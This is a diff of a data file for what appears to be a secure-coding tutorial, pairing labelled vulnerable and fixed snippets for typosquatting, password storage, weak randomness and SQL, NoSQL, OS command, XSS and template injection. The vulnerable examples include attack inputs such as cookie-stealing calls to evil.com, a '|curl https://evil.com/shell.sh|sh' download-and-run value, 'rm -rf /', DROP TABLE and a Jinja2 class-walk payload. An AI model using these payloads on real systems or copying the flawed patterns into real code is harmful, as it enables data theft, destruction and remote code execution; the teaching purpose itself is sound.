+        secureLang: "bash",
+        vulnerableCode: `# Vulnerable: Installing packages without verification
+# A developer types quickly and makes a typo:
 
-npm install expresss     // Note: 3 s's — typosquat!
-npm install lodasch      // Misspelling of 'lodash'
-npm install coloures     // Misspelling of 'colors'
+pip install djnago        # Misspelling of 'django'
+pip install reqeusts      # Misspelling of 'requests'
+pip install python-nmap2  # Fake variant of 'python-nmap'
+npm install expresss      # Note: 3 s's — typosquat!
+gem install activesupport # Missing hyphen
 
-// Attacker registered these lookalike names
-// and published packages that:
-// 1. Include the legitimate library (works normally)
-// 2. Add a hidden postinstall script
-// 3. Steal environment variables / SSH keys
-// 4. Install a backdoor or crypto miner
+# Attacker registered these lookalike names
+# and published packages that:
+# 1. Include the legitimate library (works normally)
+# 2. Add a hidden setup.py / postinstall script
+# 3. Steal environment variables / SSH keys
+# 4. Install a backdoor or crypto miner
 
-// Real-world examples:
-// - crossenv (typosquat of cross-env)
-//   Stole environment variables
-// - event-stream v3.3.6
-//   Targeted Bitcoin wallets
-// - ua-parser-js v0.7.29
-//   Installed crypto miners`,
-        secureCode: `// Secure: Verification before installing packages
-// 1. Always verify the package name and publisher
-npm info express  // Check the real package details first
+# Real-world examples:
+# - crossenv (typosquat of cross-env): stole env vars
+# - event-stream v3.3.6: targeted Bitcoin wallets
+# - ua-parser-js v0.7.29: installed crypto miners
+# - colourama (typosquat of colorama): stole crypto`,
+        secureCode: `# Secure: Verification before installing packages
 
-// 2. Use npm's provenance feature
-npm install express --expect-provenance
-// Verifies the package was built from its source repo
+# 1. Always verify the package name and publisher
+pip show requests  # Check the real package details first
+npm info express   # Verify publisher, downloads, repo URL
 
-// 3. Check package health metrics
-npx socket:npm info express
-// Reports on: maintainer count, known vulnerabilities,
-// suspicious install scripts, typosquat risk
+# 2. Use pip with hash verification
+pip install requests==2.31.0 \\
+    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7f49...
 
-// 4. Use an allowlist in CI/CD
-// .github/workflows/check.yml
-// - run: npx lockfile-lint
-//     --path package-lock.json
-//     --allowed-hosts registry.npmjs.org
-//     --validate-https
+# 3. Use a lockfile and verify in CI
+pip install --require-hashes -r requirements.txt
+npm ci  # Uses lockfile, fails on mismatch
 
-// 5. Enable npm audit signatures
-npm audit signatures
-// Verifies registry signatures on every package
+# 4. Scan dependencies before install
+pip-audit                    # Python vulnerability scanner
+npm audit signatures         # Verify npm signatures
+bundler-audit check          # Ruby gem scanner
+safety check                 # Python safety checker
 
-// 6. Review new dependencies before merging
-// Use Socket.dev GitHub app to flag suspicious
-// dependencies in pull requests automatically`,
+# 5. Use an allowlist in CI/CD
+# .github/workflows/check.yml:
+#   - run: pip-audit --require-hashes
+#   - run: npm audit --audit-level=high
+
+# 6. Review new dependencies before merging
+# Use Socket.dev, Snyk, or Dependabot to flag
+# suspicious dependencies in PRs automatically`,
       },
     ],
   },
@@ -866,149 +988,186 @@ npm audit signatures
     examples: [
       {
         title: "Plain Text / Base64 Password Storage",
-        vulnerableCode: `// Vulnerable: Storing passwords in plaintext or Base64
-function registerUser(username, password) {
-  // TERRIBLE: Plain text
-  localStorage.setItem('user_' + username, password);
+        vulnerableCode: `<?php
+// PHP — Vulnerable: Storing passwords in plaintext or Base64
 
-  // ALSO TERRIBLE: Base64 is NOT encryption
-  const encoded = btoa(password);
-  localStorage.setItem('user_' + username, encoded);
-  // Anyone can decode: atob(encoded) → password
+function registerUser($username, $password) {
+    // TERRIBLE: Plain text storage
+    $stmt = $pdo->prepare(
+        "INSERT INTO users (username, password) VALUES (?, ?)"
+    );
+    $stmt->execute([$username, $password]);
+
+    // ALSO TERRIBLE: Base64 is NOT encryption
+    $encoded = base64_encode($password);
+    // Anyone can decode: base64_decode($encoded) → password
 }
 
-function loginUser(username, password) {
-  const stored = localStorage.getItem('user_' + username);
-  // Direct comparison — no hashing at all
-  if (stored === password || stored === btoa(password)) {
-    console.log('Login successful');
-    return true;
-  }
-  return false;
-}`,
-        secureCode: `// Secure: Using Web Crypto API with PBKDF2 + salt
-async function hashPassword(password) {
-  const encoder = new TextEncoder();
-  const salt = crypto.getRandomValues(new Uint8Array(16));
+function loginUser($username, $password) {
+    $stmt = $pdo->prepare(
+        "SELECT password FROM users WHERE username = ?"
+    );
+    $stmt->execute([$username]);
+    $stored = $stmt->fetchColumn();
 
-  const keyMaterial = await crypto.subtle.importKey(
-    'raw', encoder.encode(password), 'PBKDF2', false,
-    ['deriveBits']
-  );
-
-  const hash = await crypto.subtle.deriveBits(
-    { name: 'PBKDF2', salt, iterations: 600000,
-      hash: 'SHA-256' },
-    keyMaterial, 256
-  );
-
-  const saltHex = Array.from(salt)
-    .map(b => b.toString(16).padStart(2,'0')).join('');
-  const hashHex = Array.from(new Uint8Array(hash))
-    .map(b => b.toString(16).padStart(2,'0')).join('');
-  return saltHex + ':' + hashHex;
+    // Direct comparison — no hashing at all
+    return $stored === $password;
 }
 
-async function registerUser(username, password) {
-  const stored = await hashPassword(password);
-  localStorage.setItem('user_' + username, stored);
-}`,
+// If the database is breached, ALL passwords are
+// immediately readable — no cracking needed.
+?>`,
+        secureCode: `<?php
+// PHP — Secure: password_hash with bcrypt/argon2
+
+function registerUser($username, $password) {
+    // bcrypt hash with automatic salt (built into PHP)
+    $hash = password_hash($password, PASSWORD_BCRYPT, [
+        'cost' => 12  // ~250ms to hash (tunable)
+    ]);
+    // Result: "$2y$12$LJ3m4kF..." (includes salt + hash)
+
+    $stmt = $pdo->prepare(
+        "INSERT INTO users (username, password_hash) VALUES (?, ?)"
+    );
+    $stmt->execute([$username, $hash]);
+}
+
+function loginUser($username, $password) {
+    $stmt = $pdo->prepare(
+        "SELECT password_hash FROM users WHERE username = ?"
+    );
+    $stmt->execute([$username]);
+    $hash = $stmt->fetchColumn();
+
+    // password_verify is timing-safe (prevents timing attacks)
+    return password_verify($password, $hash);
+}
+
+// Even better: Argon2id (PHP 7.3+)
+// $hash = password_hash($password, PASSWORD_ARGON2ID, [
+//     'memory_cost' => 65536,  // 64 MB
+//     'time_cost'   => 4,      // 4 iterations
+//     'threads'     => 3       // 3 parallel threads
+// ]);
+?>`,
       },
       {
         title: "Weak Hashing Algorithms (MD5 / SHA-1)",
-        vulnerableCode: `// Vulnerable: Using MD5 for password hashing
-const crypto = require('crypto');
+        vulnerableCode: `# Python — Vulnerable: Using MD5 for password hashing
+import hashlib
 
-function hashPassword(password) {
-  // MD5 is broken — collisions found since 2004
-  return crypto.createHash('md5').update(password).digest('hex');
-}
+def hash_password(password):
+    # MD5 is broken — collisions found since 2004
+    return hashlib.md5(password.encode()).hexdigest()
 
-// Also vulnerable: SHA-1 without salt
-function hashPasswordSHA1(password) {
-  return crypto.createHash('sha1').update(password).digest('hex');
-  // SHA-1 collision demonstrated by Google in 2017
-  // Vulnerable to rainbow table attacks (no salt)
-}
+# Also vulnerable: SHA-1 without salt
+def hash_password_sha1(password):
+    return hashlib.sha1(password.encode()).hexdigest()
+    # SHA-1 collision demonstrated by Google in 2017
+    # Vulnerable to rainbow table attacks (no salt)
 
-// Stored hash: "5f4dcc3b5aa765d61d8327deb882cf99"
-// Google "5f4dcc3b5aa765d61d8327deb882cf99"
-// First result: "password"
-// Pre-computed rainbow tables crack MD5 in seconds.`,
-        secureCode: `// Secure: bcrypt or Argon2 (server-side)
-const bcrypt = require('bcrypt');
+# Stored hash: "5f4dcc3b5aa765d61d8327deb882cf99"
+# Google "5f4dcc3b5aa765d61d8327deb882cf99"
+# First result: "password"
+# Pre-computed rainbow tables crack MD5 in seconds.
+# A modern GPU can compute 100 BILLION MD5 hashes/second.`,
+        secureCode: `# Python — Secure: bcrypt or Argon2 (server-side)
+import bcrypt
+from argon2 import PasswordHasher
 
-async function hashPassword(password) {
-  // bcrypt: salt is generated and embedded automatically
-  // Cost factor 12 = ~250ms to hash (tunable)
-  const hash = await bcrypt.hash(password, 12);
-  return hash;
-  // Returns: "$2b$12$LJ3m.../..." (includes algorithm + salt + hash)
-}
+# Option 1: bcrypt
+def hash_password_bcrypt(password):
+    # bcrypt: salt is generated and embedded automatically
+    # rounds=12 means 2^12 = 4096 iterations (~250ms)
+    salt = bcrypt.gensalt(rounds=12)
+    return bcrypt.hashpw(password.encode(), salt)
 
-async function verifyPassword(password, storedHash) {
-  // bcrypt.compare is timing-safe (prevents timing attacks)
-  return bcrypt.compare(password, storedHash);
-}
+def verify_password_bcrypt(password, stored_hash):
+    # bcrypt.checkpw is timing-safe (prevents timing attacks)
+    return bcrypt.checkpw(password.encode(), stored_hash)
 
-// Even better: Argon2id (winner of Password Hashing Competition)
-const argon2 = require('argon2');
-async function hashPasswordArgon2(password) {
-  return argon2.hash(password, {
-    type: argon2.argon2id,
-    memoryCost: 65536,  // 64 MB memory
-    timeCost: 3,        // 3 iterations
-    parallelism: 4      // 4 threads
-  });
-}`,
+# Option 2: Argon2id (winner of Password Hashing Competition)
+ph = PasswordHasher(
+    time_cost=3,       # 3 iterations
+    memory_cost=65536,  # 64 MB memory
+    parallelism=4       # 4 threads
+)
+
+def hash_password_argon2(password):
+    return ph.hash(password)
+    # "$argon2id$v=19$m=65536,t=3,p=4$..."
+
+def verify_password_argon2(password, stored_hash):
+    return ph.verify(stored_hash, password)`,
       },
       {
         title: "Hardcoded Encryption Keys",
-        vulnerableCode: `// Vulnerable: Encryption key hardcoded in source code
-const SECRET_KEY = 'my-super-secret-key-12345';
+        vulnerableCode: `// Java — Vulnerable: Encryption key hardcoded in source
+public class EncryptionService {
 
-function encryptData(data) {
-  const cipher = crypto.createCipher('aes-256-cbc', SECRET_KEY);
-  let encrypted = cipher.update(data, 'utf8', 'hex');
-  encrypted += cipher.final('hex');
-  return encrypted;
-}
+    // Key is in source code → visible in Git history!
+    private static final String SECRET_KEY =
+        "my-super-secret-key-12345";
 
-// Problems:
-// 1. Key is in source code → visible in Git history
-// 2. Same key for all environments (dev, staging, prod)
-// 3. Using deprecated createCipher (no IV)
-// 4. If the repo is public, the key is public
-// 5. Cannot rotate the key without a code deploy
-// 6. All developers can see production secrets`,
-        secureCode: `// Secure: Keys from environment + proper AES-GCM usage
-function encryptData(data) {
-  // Key from environment variable (not source code)
-  const keyHex = process.env.ENCRYPTION_KEY;
-  if (!keyHex || keyHex.length !== 64) {
-    throw new Error('Invalid encryption key configuration');
-  }
-  const key = Buffer.from(keyHex, 'hex');
+    public static String encrypt(String data) throws Exception {
+        SecretKeySpec keySpec = new SecretKeySpec(
+            SECRET_KEY.getBytes(), "AES"
+        );
+        // Using ECB mode — patterns in plaintext are
+        // visible in ciphertext!
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
+        byte[] encrypted = cipher.doFinal(data.getBytes());
+        return Base64.getEncoder().encodeToString(encrypted);
+    }
 
-  // Generate a random IV for each encryption
-  const iv = crypto.randomBytes(16);
+    // Problems:
+    // 1. Key in source code → visible in Git history
+    // 2. Same key for all environments (dev, staging, prod)
+    // 3. ECB mode leaks patterns (identical plaintext blocks
+    //    produce identical ciphertext blocks)
+    // 4. Cannot rotate the key without a code deploy
+}`,
+        secureCode: `// Java — Secure: Key from vault + AES-GCM
+public class EncryptionService {
 
-  // Use AES-256-GCM (authenticated encryption)
-  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
-  let encrypted = cipher.update(data, 'utf8', 'hex');
-  encrypted += cipher.final('hex');
+    // Key loaded from environment / key vault at startup
+    private final SecretKey key;
 
-  // GCM produces an auth tag — include it
-  const authTag = cipher.getAuthTag().toString('hex');
+    public EncryptionService() throws Exception {
+        String keyHex = System.getenv("ENCRYPTION_KEY");
+        if (keyHex == null || keyHex.length() != 64) {
+            throw new IllegalStateException(
+                "Invalid encryption key configuration"
+            );
+        }
+        byte[] keyBytes = HexFormat.of().parseHex(keyHex);
+        this.key = new SecretKeySpec(keyBytes, "AES");
+    }
 
-  // Return IV + authTag + ciphertext (all needed for decryption)
-  return iv.toString('hex') + ':' + authTag + ':' + encrypted;
-}
+    public String encrypt(String data) throws Exception {
+        // Generate random IV for each encryption
+        byte[] iv = new byte[12]; // 96-bit IV for GCM
+        SecureRandom.getInstanceStrong().nextBytes(iv);
 
-// Key management:
-// - Store in AWS KMS / HashiCorp Vault / Azure Key Vault
-// - Rotate keys regularly with zero-downtime strategy
-// - Separate keys per environment`,
+        // Use AES-256-GCM (authenticated encryption)
+        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+        cipher.init(Cipher.ENCRYPT_MODE, key,
+            new GCMParameterSpec(128, iv));
+        byte[] ciphertext = cipher.doFinal(
+            data.getBytes(StandardCharsets.UTF_8));
+
+        // Prepend IV to ciphertext (needed for decryption)
+        byte[] result = new byte[iv.length + ciphertext.length];
+        System.arraycopy(iv, 0, result, 0, iv.length);
+        System.arraycopy(ciphertext, 0, result, iv.length,
+            ciphertext.length);
+
+        return Base64.getEncoder().encodeToString(result);
+    }
+    // Key management: AWS KMS / HashiCorp Vault / Azure Key Vault
+}`,
       },
       {
         title: "Data Transmitted Over HTTP (No TLS)",
@@ -1020,10 +1179,10 @@ function encryptData(data) {
 </form>
 
 <!--
-  Data sent in plaintext over the network.
+  Data sent in PLAINTEXT over the network.
 
   An attacker on the same network (coffee shop WiFi,
-  corporate network, ISP) can see:
+  corporate network, ISP) can see everything:
 
   POST /login HTTP/1.1
   Host: api.example.com
@@ -1031,13 +1190,17 @@ function encryptData(data) {
 
   username=alice&password=MySecretPass123
 
-  Tools: Wireshark, tcpdump, mitmproxy
+  Interception tools: Wireshark, tcpdump, mitmproxy
   No special skills required to intercept.
+
+  Also leaked: session cookies, API tokens, personal data
+  in ALL subsequent HTTP requests.
 -->`,
         secureCode: `<!-- Secure: HTTPS with HSTS enforcement -->
 <form action="https://api.example.com/login" method="POST">
   <input type="text" name="username" autocomplete="username">
-  <input type="password" name="password" autocomplete="current-password">
+  <input type="password" name="password"
+         autocomplete="current-password">
   <button type="submit">Login</button>
 </form>
 
@@ -1052,64 +1215,65 @@ function encryptData(data) {
   - OCSP stapling enabled
   - Certificate transparency logged
   - HTTP automatically redirects to HTTPS (301)
-  - Secure cookies: Set-Cookie: session=...; Secure;
-    HttpOnly; SameSite=Strict
+  - Secure cookies:
+    Set-Cookie: session=...; Secure; HttpOnly; SameSite=Strict
   - Submit domain to HSTS preload list:
     https://hstspreload.org
 -->`,
       },
       {
         title: "Weak Random Number Generation",
-        vulnerableCode: `// Vulnerable: Math.random() for security-sensitive values
-function generateSessionToken() {
-  // Math.random() is NOT cryptographically secure
-  // It uses a PRNG that can be predicted
-  return 'session_' + Math.random().toString(36).substring(2);
-}
+        vulnerableCode: `# Python — Vulnerable: random module for security values
+import random
+import string
 
-function generatePasswordResetToken() {
-  // Easily predictable — attacker can brute-force
-  const token = Math.floor(Math.random() * 1000000);
-  return token.toString().padStart(6, '0');
-  // Only 1 million possible values!
-}
+def generate_session_token():
+    # random module is NOT cryptographically secure
+    # It uses Mersenne Twister — state can be predicted
+    # after observing 624 outputs
+    chars = string.ascii_letters + string.digits
+    return ''.join(random.choice(chars) for _ in range(32))
 
-function generateAPIKey() {
-  // Combining multiple Math.random() calls does NOT help
-  let key = '';
-  for (let i = 0; i < 32; i++) {
-    key += Math.random().toString(36).charAt(2);
-  }
-  return key;
-  // Still predictable — same underlying weak PRNG
-}`,
-        secureCode: `// Secure: crypto.getRandomValues / crypto.randomUUID
-function generateSessionToken() {
-  // Cryptographically secure random bytes
-  const bytes = new Uint8Array(32);
-  crypto.getRandomValues(bytes);
-  return Array.from(bytes)
-    .map(b => b.toString(16).padStart(2, '0'))
-    .join('');
-  // 256 bits of entropy — cannot be predicted
-}
+def generate_reset_token():
+    # Easily predictable — attacker can brute-force
+    return str(random.randint(100000, 999999))
+    # Only 900,000 possible values!
 
-function generatePasswordResetToken() {
-  // Use crypto.randomUUID() for unique tokens
-  return crypto.randomUUID();
-  // "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
-  // 122 bits of entropy from CSPRNG
-}
+def generate_api_key():
+    # Seeding with time makes it even more predictable
+    random.seed(int(time.time()))
+    return ''.join(random.choices(
+        string.ascii_letters + string.digits, k=40
+    ))
+    # Attacker knows the approximate seed (current time)
+    # Can generate the same "random" key`,
+        secureCode: `# Python — Secure: secrets module (cryptographically safe)
+import secrets
+import uuid
 
-function generateAPIKey() {
-  // 32 bytes = 256 bits of cryptographic randomness
-  const bytes = crypto.getRandomValues(new Uint8Array(32));
-  // Base64url encoding (URL-safe, no padding)
-  return btoa(String.fromCharCode(...bytes))
-    .replace(/\\+/g, '-')
-    .replace(/\\//g, '_')
-    .replace(/=/g, '');
-}`,
+def generate_session_token():
+    # secrets uses os.urandom() — cryptographically secure
+    return secrets.token_hex(32)  # 256 bits of entropy
+    # "a1b2c3d4e5f6...64 hex characters"
+    # Cannot be predicted even after observing prior outputs
+
+def generate_reset_token():
+    # URL-safe token (for password reset links)
+    return secrets.token_urlsafe(32)
+    # "dGhpcyBpcyBhIHRva2Vu..." (43 characters)
+    # 256 bits of entropy — not brute-forceable
+
+def generate_api_key():
+    # UUID4 uses cryptographic random source
+    return str(uuid.uuid4())
+    # "f47ac10b-58cc-4372-a567-0e02b2c3d479"
+    # 122 bits of entropy from CSPRNG
+
+# IMPORTANT: Never use these for security purposes:
+# - random.random()     → predictable PRNG
+# - random.randint()    → predictable PRNG
+# - random.choice()     → predictable PRNG
+# ALWAYS use: secrets.token_hex(), secrets.token_urlsafe()`,
       },
     ],
   },
@@ -1137,6 +1301,66 @@ function generateAPIKey() {
     },
     examples: [
       {
+        title: "SQL Injection",
+        vulnerableCode: `# Python — Vulnerable: String formatting in SQL query
+from flask import request
+import sqlite3
+
+@app.route('/api/users')
+def get_users():
+    username = request.args.get('username')
+
+    # User input directly formatted into SQL string
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    cursor.execute(query)
+    return jsonify(cursor.fetchall())
+
+# Normal request:
+# GET /api/users?username=alice
+# Query: SELECT * FROM users WHERE username = 'alice'
+
+# Attack:
+# GET /api/users?username=' OR '1'='1' --
+# Query: SELECT * FROM users WHERE username = ''
+#        OR '1'='1' --'
+# Returns ALL users in the database!
+
+# Destructive attack:
+# GET /api/users?username='; DROP TABLE users; --
+# Deletes the entire users table.`,
+        secureCode: `# Python — Secure: Parameterized queries
+from flask import request
+import sqlite3
+
+@app.route('/api/users')
+def get_users():
+    username = request.args.get('username')
+
+    # Parameterized query — user input is NEVER part of SQL
+    query = "SELECT * FROM users WHERE username = ?"
+    cursor.execute(query, (username,))
+    return jsonify(cursor.fetchall())
+
+# The database driver treats the parameter as DATA,
+# never as SQL syntax. Even if the input contains:
+#   ' OR '1'='1' --
+# It searches for a user literally named:
+#   "' OR '1'='1' --"
+# ...which doesn't exist. No injection possible.
+
+# Using an ORM (even safer):
+# SQLAlchemy
+user = User.query.filter_by(username=username).first()
+# Django ORM
+user = User.objects.get(username=username)
+# Both handle parameterization automatically.
+
+# Additional defenses:
+# - Input validation (allowlist of characters)
+# - Least privilege DB user (read-only where possible)
+# - WAF rules for SQL injection patterns`,
+      },
+      {
         title: "DOM-Based XSS via innerHTML",
         vulnerableCode: `<!-- Vulnerable: Using innerHTML with unsanitized input -->
 <input type="text" id="search" placeholder="Search...">
@@ -1148,14 +1372,20 @@ function generateAPIKey() {
 
   input.addEventListener('input', function() {
     const query = input.value;
+
     // DANGEROUS: Directly injecting user input into DOM
     results.innerHTML =
       '<p>Results for: <strong>' + query + '</strong></p>';
 
     // If a user types:
     //   <img src=x onerror=alert('XSS')>
+    //
     // The browser creates an <img> tag, the src fails,
-    // and the onerror handler executes arbitrary JS.
+    // and the onerror handler executes arbitrary JavaScript.
+    //
+    // More dangerous payloads:
+    //   <script>fetch('https://evil.com?c='+document.cookie)<\/script>
+    //   <img src=x onerror="new Image().src='https://evil.com?c='+document.cookie">
   });
 </script>`,
         secureCode: `<!-- Secure: Using textContent + DOMPurify -->
@@ -1172,260 +1402,220 @@ purify.min.js"></script>
   input.addEventListener('input', function() {
     const query = input.value;
 
-    // Option 1: textContent (safest — no HTML parsing)
+    // Option 1: textContent (safest — no HTML parsing at all)
     results.textContent = 'Results for: ' + query;
+    // All HTML tags are rendered as visible text, never executed
 
-    // Option 2: If you NEED HTML, sanitize first
-    // const clean = DOMPurify.sanitize(query);
+    // Option 2: If you NEED HTML, sanitize with DOMPurify first
+    // const clean = DOMPurify.sanitize(query, {
+    //   ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
+    //   ALLOWED_ATTR: []
+    // });
     // results.innerHTML =
     //   '<p>Results for: <strong>' + clean + '</strong></p>';
 
-    // Both approaches neutralize the XSS payload.
+    // Both approaches neutralize the XSS payload:
     // <img src=x onerror=alert('XSS')> is rendered
-    // as harmless visible text, not executed as HTML.
+    // as harmless visible text, never executed as HTML.
   });
 </script>`,
       },
       {
-        title: "SQL Injection",
-        vulnerableCode: `// Vulnerable: String concatenation in SQL query
-app.get('/api/users', (req, res) => {
-  const username = req.query.username;
+        title: "OS Command Injection",
+        vulnerableCode: `# Ruby — Vulnerable: User input in system command
+require 'sinatra'
 
-  // User input directly concatenated into SQL
-  const query = "SELECT * FROM users WHERE username = '"
-    + username + "'";
+get '/api/ping' do
+  host = params[:host]
 
-  db.execute(query);
+  # User input directly inserted into shell command!
+  output = \`ping -c 3 #{host}\`
+
+  content_type :json
+  { result: output }.to_json
+end
+
+# Normal request:
+# GET /api/ping?host=google.com
+# Command: ping -c 3 google.com
+
+# Attack:
+# GET /api/ping?host=google.com;cat /etc/passwd
+# Command: ping -c 3 google.com;cat /etc/passwd
+# Runs TWO commands — returns the password file!
+
+# Destructive:
+# GET /api/ping?host=;rm -rf /
+# GET /api/ping?host=|curl https://evil.com/shell.sh|sh
+# Downloads and executes a remote script!`,
+        secureCode: `# Ruby — Secure: Input validation + safe command execution
+require 'sinatra'
+require 'resolv'
+require 'open3'
+
+VALID_HOSTNAME = /\\A[a-zA-Z0-9][a-zA-Z0-9.\\-]{0,253}[a-zA-Z0-9]\\z/
+
+get '/api/ping' do
+  host = params[:host]
+
+  # Step 1: Validate input format
+  unless host&.match?(VALID_HOSTNAME)
+    halt 400, { error: "Invalid hostname" }.to_json
+  end
+
+  # Step 2: Verify it resolves to a public IP
+  begin
+    ip = Resolv.getaddress(host)
+    if ip.start_with?("10.", "192.168.", "172.", "127.")
+      halt 403, { error: "Internal hosts not allowed" }.to_json
+    end
+  rescue Resolv::ResolvError
+    halt 400, { error: "Hostname not found" }.to_json
+  end
+
+  # Step 3: Use array form — shell metacharacters not interpreted
+  stdout, stderr, status = Open3.capture3(
+    "ping", "-c", "3", host
+  )
+  # "ping", "-c", "3", "google.com;cat /etc/passwd"
+  # Treated as a single argument — no shell injection possible
+
+  content_type :json
+  { result: stdout, success: status.success? }.to_json
+end`,
+      },
+      {
+        title: "NoSQL Injection",
+        vulnerableCode: `// Node.js + MongoDB — Vulnerable: Unvalidated query input
+app.post('/api/login', async (req, res) => {
+  const { username, password } = req.body;
+
+  // User input directly used in MongoDB query
+  const user = await db.collection('users').findOne({
+    username: username,
+    password: password
+  });
+
+  if (user) {
+    res.json({ success: true, token: generateToken(user) });
+  } else {
+    res.status(401).json({ error: 'Invalid credentials' });
+  }
 });
 
 // Normal request:
-// GET /api/users?username=alice
-// Query: SELECT * FROM users WHERE username = 'alice'
+// POST /api/login
+// { "username": "admin", "password": "secret123" }
 
-// Attack:
-// GET /api/users?username=' OR '1'='1' --
-// Query: SELECT * FROM users WHERE username = ''
-//        OR '1'='1' --'
-// Returns ALL users in the database!
+// Attack — send a MongoDB operator as password:
+// POST /api/login
+// { "username": "admin", "password": { "$ne": "" } }
+//
+// Query becomes:
+// { username: "admin", password: { $ne: "" } }
+// This matches ANY document where password is NOT empty
+// → Admin login without knowing the password!
 
-// Destructive attack:
-// GET /api/users?username='; DROP TABLE users; --
-// Deletes the entire users table.`,
-        secureCode: `// Secure: Parameterized queries (prepared statements)
-app.get('/api/users', (req, res) => {
-  const username = req.query.username;
+// Other attacks:
+// { "$gt": "" }  → matches any non-empty string
+// { "$regex": ".*" } → matches everything`,
+        secureCode: `// Node.js + MongoDB — Secure: Input sanitization + type checking
+app.post('/api/login', async (req, res) => {
+  const { username, password } = req.body;
 
-  // Parameterized query — user input is NEVER part of SQL
-  const query = 'SELECT * FROM users WHERE username = ?';
-  db.execute(query, [username]);
+  // Step 1: Ensure inputs are strings (not objects/operators)
+  if (typeof username !== 'string' || typeof password !== 'string') {
+    return res.status(400).json({ error: 'Invalid input type' });
+  }
+
+  // Step 2: Find user by username only
+  const user = await db.collection('users').findOne({
+    username: username
+  });
+
+  if (!user) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  // Step 3: Compare password hash separately (not in query)
+  const isValid = await bcrypt.compare(password, user.passwordHash);
+  if (!isValid) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  res.json({ success: true, token: generateToken(user) });
 });
 
-// The database driver treats the parameter as DATA,
-// never as SQL syntax. Even if the input contains:
-//   ' OR '1'='1' --
-// It searches for a user literally named:
-//   "' OR '1'='1' --"
-// ...which doesn't exist. No injection possible.
-
-// Using an ORM (even safer):
-const user = await User.findOne({
-  where: { username: req.query.username }
-});
-// ORM handles parameterization automatically.
+// { "password": { "$ne": "" } } → rejected at type check
+// Only string values are accepted — MongoDB operators blocked
 
 // Additional defenses:
-// - Input validation (allowlist of characters)
-// - Least privilege DB user (read-only where possible)
-// - WAF rules for SQL injection patterns`,
+// - Use mongoose with schema validation (enforces types)
+// - Use express-mongo-sanitize middleware
+// - Never pass raw req.body into database queries`,
       },
       {
-        title: "URL / Link Injection (javascript: protocol)",
-        vulnerableCode: `// Vulnerable: User-supplied URL rendered as href
-function renderUserProfile(user) {
-  const html = \`
-    <div class="profile">
-      <h2>\${user.name}</h2>
-      <a href="\${user.website}">Visit Website</a>
-    </div>
-  \`;
-  document.getElementById('profile').innerHTML = html;
-}
+        title: "Template Injection (SSTI)",
+        vulnLang: "python",
+        secureLang: "python",
+        vulnerableCode: `# Python Jinja2 — Vulnerable: User input in template string
+from flask import Flask, request, render_template_string
 
-// User submits their profile:
-renderUserProfile({
-  name: 'Attacker',
-  website: "javascript:alert(document.cookie)"
-});
+app = Flask(__name__)
 
-// The link looks normal but when clicked:
-// <a href="javascript:alert(document.cookie)">
-// Executes JavaScript in the context of the page.
-// Can also use: javascript:fetch('https://evil.com/steal'
-//   + '?c=' + document.cookie)`,
-        secureCode: `// Secure: URL validation + protocol allowlist
-function sanitizeUrl(url) {
-  try {
-    const parsed = new URL(url);
-    // Only allow safe protocols
-    const allowedProtocols = ['https:', 'http:', 'mailto:'];
-    if (!allowedProtocols.includes(parsed.protocol)) {
-      return '#'; // Safe fallback
-    }
-    return parsed.href;
-  } catch {
-    return '#'; // Invalid URL → safe fallback
-  }
-}
+@app.route('/greet')
+def greet():
+    name = request.args.get('name', 'World')
 
-function renderUserProfile(user) {
-  const container = document.getElementById('profile');
-  container.innerHTML = ''; // Clear previous content
+    # DANGEROUS: User input directly in template string!
+    template = f"<h1>Hello {name}!</h1>"
+    return render_template_string(template)
 
-  const h2 = document.createElement('h2');
-  h2.textContent = user.name; // Safe: textContent
+# Normal request:
+# GET /greet?name=Alice
+# Output: <h1>Hello Alice!</h1>
 
-  const link = document.createElement('a');
-  link.href = sanitizeUrl(user.website); // Validated URL
-  link.textContent = 'Visit Website';
-  link.rel = 'noopener noreferrer'; // Prevent tab-napping
-  link.target = '_blank';
+# Attack — Server-Side Template Injection (SSTI):
+# GET /greet?name={{7*7}}
+# Output: <h1>Hello 49!</h1>  ← Template engine evaluated it!
 
-  container.append(h2, link);
-}
+# Remote Code Execution:
+# GET /greet?name={{config.items()}}
+# → Dumps all Flask configuration (SECRET_KEY, DB passwords)
 
-// "javascript:alert(...)" → blocked (not http/https)
-// "https://example.com" → allowed`,
-      },
-      {
-        title: "Template Literal Injection",
-        vulnerableCode: `// Vulnerable: Using eval / Function with template input
-function renderTemplate(template, data) {
-  // DANGEROUS: Creates a function from user-controlled string
-  const fn = new Function('data',
-    'return \`' + template + '\`'
-  );
-  return fn(data);
-}
+# GET /greet?name={{''.__class__.__mro__[1].__subclasses__()}}
+# → Lists all Python classes → find os.system → execute commands`,
+        secureCode: `# Python Jinja2 — Secure: Pass data as template variables
+from flask import Flask, request, render_template_string
+from markupsafe import escape
 
-// Developer expects:
-// renderTemplate('Hello \${data.name}!', { name: 'Alice' })
-// → "Hello Alice!"
+app = Flask(__name__)
 
-// Attacker submits as template:
-// '\${(function(){ fetch("https://evil.com/?cookie="
-//    + document.cookie); return "pwned"})()}'
-//
-// The Function constructor executes arbitrary code
-// in the template string context.
+@app.route('/greet')
+def greet():
+    name = request.args.get('name', 'World')
 
-// Even simpler attack:
-// '\${constructor.constructor("return this")().process.exit()}'`,
-        secureCode: `// Secure: Use a safe templating approach
-function renderTemplate(template, data) {
-  // Replace only known placeholders — no code execution
-  return template.replace(
-    /\\{\\{(\\w+)\\}\\}/g,
-    (match, key) => {
-      // Only allow known keys from the data object
-      if (Object.hasOwn(data, key)) {
-        return escapeHtml(String(data[key]));
-      }
-      return match; // Leave unknown placeholders as-is
-    }
-  );
-}
+    # SAFE: User input passed as a template variable
+    # Jinja2 auto-escapes variables in {{ }} by default
+    template = "<h1>Hello {{ name }}!</h1>"
+    return render_template_string(template, name=name)
 
-function escapeHtml(str) {
-  const div = document.createElement('div');
-  div.textContent = str;
-  return div.innerHTML;
-}
+# GET /greet?name={{7*7}}
+# Output: <h1>Hello {{7*7}}!</h1>
+# The {{ }} is treated as literal text, NOT evaluated
 
-// Usage with Mustache-style syntax (no code execution):
